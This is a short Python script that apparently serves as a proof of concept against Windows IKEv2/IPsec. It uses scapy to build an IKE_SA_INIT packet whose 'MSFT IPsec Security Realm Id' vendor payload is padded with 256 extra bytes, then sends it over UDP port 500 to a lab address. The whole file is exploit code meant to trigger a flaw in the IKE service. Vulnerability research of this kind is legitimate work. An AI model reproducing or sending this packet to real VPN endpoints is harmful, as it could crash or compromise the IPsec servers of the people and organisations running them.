from scapy.all import *
from scapy.contrib.ikev2 import *

import socket

target = ("192.168.159.134", 500)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

pkt = IKEv2(init_SPI=RandString(8), exch_type=34, flags=0x8) 
pkt /= IKEv2_payload_SA(prop=IKEv2_payload_Proposal(), next_payload=34)
pkt /= IKEv2_payload_KE(next_payload=43)
pkt /= IKEv2_payload_VendorID(vendorID=b"\x68\x6a\x8c\xbd\xfe\x63\x4b\x40\x51\x46\xfb\x2b\xaf\x33\xe9\xe8" + b"a"*0x100)
#"MSFT IPsec Security Realm Id"

wireshark(IP() / UDP(sport=500, dport=500) / pkt)

sock.sendto(raw(pkt), target)
